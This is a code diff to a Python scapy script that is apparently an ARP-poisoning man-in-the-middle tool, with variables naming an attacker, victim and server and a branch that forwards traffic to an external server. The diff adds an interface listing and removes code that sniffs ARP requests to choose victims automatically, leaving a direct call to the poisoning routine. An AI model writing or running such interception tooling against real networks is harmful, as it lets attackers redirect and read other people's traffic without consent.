@@ -13,6 +13,7 @@ attackerMac = sc.get_if_hwaddr(sc.conf.iface)
 
 
 def main():
+    sc.show_interfaces()
     while True:
         ipt = ""
         ip_range = ""
@@ -72,25 +73,7 @@ def main():
                 serverIP = parts[1] if parts[1] != "none" else None
                 print("len part", victimIP, " server: ",serverIP)
 
-                if (victimIP is not None and serverIP is None):
-                    pkt =  sc.sniff(filter="arp", store=0)
-
-                    if pkt.haslayer(sc.ARP):
-                        arp = pkt[sc.ARP]
-                        if arp.op == 1 and arp.psrc == victimIP:
-                            serverMac, victimMac = ArpPoisen.arp_poisoning(victimIP, arp.pdst, silent)
-                            
-                
-                elif (victimIP is None and serverIP is None):
-                    pkt =  sc.sniff(filter="arp", store=0)
-                    if pkt.haslayer(sc.ARP):
-                        arp = pkt[sc.ARP]
-                        if arp.op == 1:
-                            serverMac, victimMac = ArpPoisen.arp_poisoning(arp.psrc, arp.pdst, silent)
-
-                else:
-                    print("else option", victimIP, serverIP, silent)
-                    serverMac, victimMac = ArpPoisen.arp_poisoning(victimIP, serverIP, silent)
+                ArpPoisen.arp_poisoning(victimIP, serverIP, silent)
 
                 if goal == "ownserver":
                     forwardToExternalServer()
